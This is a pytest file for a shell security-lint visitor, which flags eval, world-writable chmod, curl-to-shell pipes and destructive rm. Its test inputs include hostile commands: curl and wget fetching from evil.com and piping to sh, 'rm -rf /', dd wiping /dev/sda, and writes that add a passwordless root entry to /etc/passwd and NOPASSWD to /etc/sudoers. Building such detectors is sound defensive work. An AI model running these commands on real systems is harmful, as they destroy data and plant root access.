"""
Tests for the SecurityVisitor.

This module tests security vulnerability detection functionality.
"""

import pytest
from psh.state_machine_lexer import tokenize
from psh.parser import parse
from psh.visitor.security_visitor import SecurityVisitor, SecurityIssue


class TestSecurityVisitor:
    """Test security vulnerability detection."""
    
    def parse_command(self, command):
        """Helper to parse a command string."""
        tokens = tokenize(command)
        return parse(tokens)
    
    def get_security_issues(self, command):
        """Parse command and return security issues."""
        ast = self.parse_command(command)
        visitor = SecurityVisitor()
        visitor.visit(ast)
        return visitor.issues
    
    def test_dangerous_eval_command(self):
        """Test detection of eval command."""
        issues = self.get_security_issues("eval \"$user_input\"")
        
        # Check for eval detection
        eval_issues = [i for i in issues if i.issue_type == 'DANGEROUS_COMMAND']
        assert len(eval_issues) == 1
        assert eval_issues[0].severity == 'HIGH'
        assert 'eval' in eval_issues[0].message
        assert 'code execution' in eval_issues[0].message
        
        # For quoted variable, we only expect the eval warning, not unquoted expansion
        assert len(issues) == 1
    
    def test_source_command(self):
        """Test detection of source/. commands."""
        # Test 'source' command
        issues = self.get_security_issues("source /tmp/script.sh")
        assert len(issues) == 1
        assert issues[0].severity == 'HIGH'
        assert issues[0].issue_type == 'DANGEROUS_COMMAND'
        assert 'source' in issues[0].message
        
        # Test '.' command
        issues = self.get_security_issues(". /tmp/script.sh")
        assert len(issues) == 1
        assert issues[0].severity == 'HIGH'
        assert '.' in issues[0].message
    
    def test_world_writable_permissions(self):
        """Test detection of world-writable permissions."""
        # Test octal 777
        issues = self.get_security_issues("chmod 777 /tmp/file")
        assert len(issues) == 2  # chmod command + world-writable
        world_writable = [i for i in issues if i.issue_type == 'WORLD_WRITABLE']
        assert len(world_writable) == 1
        assert world_writable[0].severity == 'HIGH'
        
        # Test octal 666
        issues = self.get_security_issues("chmod 666 /tmp/file")
        world_writable = [i for i in issues if i.issue_type == 'WORLD_WRITABLE']
        assert len(world_writable) == 1
        
        # Test symbolic o+w
        issues = self.get_security_issues("chmod o+w /tmp/file")
        world_writable = [i for i in issues if i.issue_type == 'WORLD_WRITABLE']
        assert len(world_writable) == 1
        
        # Test symbolic a+w
        issues = self.get_security_issues("chmod a+w /tmp/file")
        world_writable = [i for i in issues if i.issue_type == 'WORLD_WRITABLE']
        assert len(world_writable) == 1
        
        # Test safe permissions (no world-writable issue)
        issues = self.get_security_issues("chmod 755 /tmp/file")
        world_writable = [i for i in issues if i.issue_type == 'WORLD_WRITABLE']
        assert len(world_writable) == 0
    
    def test_unquoted_variable_in_eval(self):
        """Test detection of unquoted variables in dangerous commands."""
        # Unquoted variable in eval
        issues = self.get_security_issues("eval $cmd")
        # Should have both eval warning and unquoted expansion
        assert len(issues) >= 1
        unquoted = [i for i in issues if i.issue_type == 'UNQUOTED_EXPANSION']
        assert len(unquoted) == 1
        assert unquoted[0].severity == 'HIGH'
        assert 'command injection' in unquoted[0].message
        
        # Quoted variable should not trigger unquoted expansion warning
        issues = self.get_security_issues("eval \"$cmd\"")
        unquoted = [i for i in issues if i.issue_type == 'UNQUOTED_EXPANSION']
        assert len(unquoted) == 0
        
        # Unquoted in sh/bash
        issues = self.get_security_issues("sh -c $script")
        unquoted = [i for i in issues if i.issue_type == 'UNQUOTED_EXPANSION']
        assert len(unquoted) == 1
    
    def test_dangerous_rm_commands(self):
        """Test detection of dangerous rm operations."""
        # rm -rf /
        issues = self.get_security_issues("rm -rf /")
        dangerous_rm = [i for i in issues if i.issue_type == 'DANGEROUS_RM']
        assert len(dangerous_rm) == 1
        assert dangerous_rm[0].severity == 'HIGH'
        
        # rm -rf /*
        issues = self.get_security_issues("rm -rf /*")
        dangerous_rm = [i for i in issues if i.issue_type == 'DANGEROUS_RM']
        assert len(dangerous_rm) == 1
        
        # rm -rf /etc
        issues = self.get_security_issues("rm -rf /etc")
        dangerous_rm = [i for i in issues if i.issue_type == 'DANGEROUS_RM']
        assert len(dangerous_rm) == 1
        
        # Safe rm should not trigger
        issues = self.get_security_issues("rm -rf /tmp/test")
        dangerous_rm = [i for i in issues if i.issue_type == 'DANGEROUS_RM']
        assert len(dangerous_rm) == 0
    
    def test_remote_code_execution_pipeline(self):
        """Test detection of curl/wget piped to shell."""
        # curl | sh
        issues = self.get_security_issues("curl http://evil.com/script | sh")
        remote_exec = [i for i in issues if i.issue_type == 'REMOTE_CODE_EXECUTION']
        assert len(remote_exec) == 1
        assert remote_exec[0].severity == 'HIGH'
        
        # wget | bash
        issues = self.get_security_issues("wget -O - http://evil.com | bash")
        remote_exec = [i for i in issues if i.issue_type == 'REMOTE_CODE_EXECUTION']
        assert len(remote_exec) == 1
        
        # Safe curl usage should not trigger
        issues = self.get_security_issues("curl http://example.com > file.txt")
        remote_exec = [i for i in issues if i.issue_type == 'REMOTE_CODE_EXECUTION']
        assert len(remote_exec) == 0
    
    def test_sensitive_file_writes(self):
        """Test detection of writing to sensitive files."""
        # Writing to /etc/passwd
        issues = self.get_security_issues("echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd")
        sensitive = [i for i in issues if i.issue_type == 'SENSITIVE_FILE_WRITE']
        assert len(sensitive) == 1
        assert sensitive[0].severity == 'HIGH'
        
        # Appending to /etc/shadow
        issues = self.get_security_issues("echo 'user:*:18000:0:99999:7:::' >> /etc/shadow")
        sensitive = [i for i in issues if i.issue_type == 'SENSITIVE_FILE_WRITE']
        assert len(sensitive) == 1
        
        # Writing to /etc/sudoers
        issues = self.get_security_issues("echo 'user ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers")
        sensitive = [i for i in issues if i.issue_type == 'SENSITIVE_FILE_WRITE']
        assert len(sensitive) == 1
        
        # Reading sensitive files should not trigger
        issues = self.get_security_issues("cat /etc/passwd")
        sensitive = [i for i in issues if i.issue_type == 'SENSITIVE_FILE_WRITE']
        assert len(sensitive) == 0
    
    def test_sensitive_commands(self):
        """Test detection of sensitive but not necessarily dangerous commands."""
        # chmod (sensitive but not dangerous by itself)
        issues = self.get_security_issues("chmod 755 file.txt")
        sensitive = [i for i in issues if i.issue_type == 'SENSITIVE_COMMAND']
        assert len(sensitive) == 1
        assert sensitive[0].severity == 'MEDIUM'
        
        # chown
        issues = self.get_security_issues("chown root:root file.txt")
        sensitive = [i for i in issues if i.issue_type == 'SENSITIVE_COMMAND']
        assert len(sensitive) == 1
        
        # dd
        issues = self.get_security_issues("dd if=/dev/zero of=/dev/sda")
        sensitive = [i for i in issues if i.issue_type == 'SENSITIVE_COMMAND']
        assert len(sensitive) == 1
    
    def test_unquoted_command_substitution_in_loop(self):
        """Test detection of unquoted command substitution in for loops."""
        issues = self.get_security_issues("for file in $(ls *.txt); do echo $file; done")
        unquoted = [i for i in issues if i.issue_type == 'UNQUOTED_SUBSTITUTION']
        assert len(unquoted) == 1
        assert unquoted[0].severity == 'MEDIUM'
        assert 'spaces' in unquoted[0].message
    
    def test_arithmetic_injection(self):
        """Test detection of variable expansion in arithmetic expressions."""
        issues = self.get_security_issues("((result = $user_input * 2))")
        arith = [i for i in issues if i.issue_type == 'ARITHMETIC_INJECTION']
        assert len(arith) == 1
        assert arith[0].severity == 'MEDIUM'
        assert 'numbers' in arith[0].message
        
        # Pure numeric should not trigger
        issues = self.get_security_issues("((x = 5 * 2))")
        arith = [i for i in issues if i.issue_type == 'ARITHMETIC_INJECTION']
        # Note: 'x' is detected as a variable name, which is expected
        # The test should check a truly pure numeric expression
        issues2 = self.get_security_issues("((5 * 2))")
        arith2 = [i for i in issues2 if i.issue_type == 'ARITHMETIC_INJECTION']
        assert len(arith2) == 0
    
    def test_complex_script_analysis(self):
        """Test analysis of a script with multiple issues."""
        script = """
        #!/bin/bash
        # Get user input
        read -p "Enter command: " user_cmd
        
        # DANGEROUS: Direct eval of user input
        eval $user_cmd
        
        # World-writable log file
        chmod 777 /var/log/app.log
        
        # Download and execute remote script
        curl https://example.com/install.sh | bash
        
        # Dangerous rm with variable
        rm -rf /$dirname/*
        """
        
        issues = self.get_security_issues(script)
        
        # Check we found multiple issues
        assert len(issues) >= 5
        
        # Verify different issue types were found
        issue_types = set(i.issue_type for i in issues)
        assert 'DANGEROUS_COMMAND' in issue_types
        assert 'WORLD_WRITABLE' in issue_types
        assert 'REMOTE_CODE_EXECUTION' in issue_types
        # Should also have UNQUOTED_EXPANSION from eval $user_cmd
        assert 'UNQUOTED_EXPANSION' in issue_types
    
    def test_security_report(self):
        """Test the security report generation."""
        script = """
        eval $cmd
        chmod 777 /tmp/file
        rm -f /tmp/test
        """
        
        ast = self.parse_command(script)
        visitor = SecurityVisitor()
        visitor.visit(ast)
        
        report = visitor.get_report()
        
        assert 'total_issues' in report
        assert 'high_severity' in report
        assert 'medium_severity' in report
        assert 'low_severity' in report
        assert 'issues' in report
        
        assert report['total_issues'] == len(visitor.issues)
        assert report['high_severity'] > 0
        assert report['issues'] == visitor.issues
    
    def test_nested_structures(self):
        """Test security analysis in nested structures."""
        # Issues in if statements
        issues = self.get_security_issues("""
        if [ -f /tmp/file ]; then
            eval $cmd
        fi
        """)
        assert any(i.issue_type == 'DANGEROUS_COMMAND' for i in issues)
        
        # Issues in functions
        issues = self.get_security_issues("""
        function deploy() {
            chmod 777 /app
            curl http://example.com/deploy.sh | sh
        }
        """)
        assert any(i.issue_type == 'WORLD_WRITABLE' for i in issues)
        assert any(i.issue_type == 'REMOTE_CODE_EXECUTION' for i in issues)
    
    def test_no_false_positives(self):
        """Test that safe code doesn't trigger false positives."""
        # Safe eval with literal string
        issues = self.get_security_issues("eval 'echo hello'")
        # Should only flag eval as dangerous, not unquoted expansion
        unquoted = [i for i in issues if i.issue_type == 'UNQUOTED_EXPANSION']
        assert len(unquoted) == 0
        
        # Safe file operations
        issues = self.get_security_issues("""
        touch /tmp/test.txt
        echo "data" > /tmp/output.log
        cat /etc/hosts
        ls -la /home
        """)
        # Should not have any HIGH severity issues
        high_issues = [i for i in issues if i.severity == 'HIGH']
        assert len(high_issues) == 0


if __name__ == '__main__':
    pytest.main([__file__, '-v'])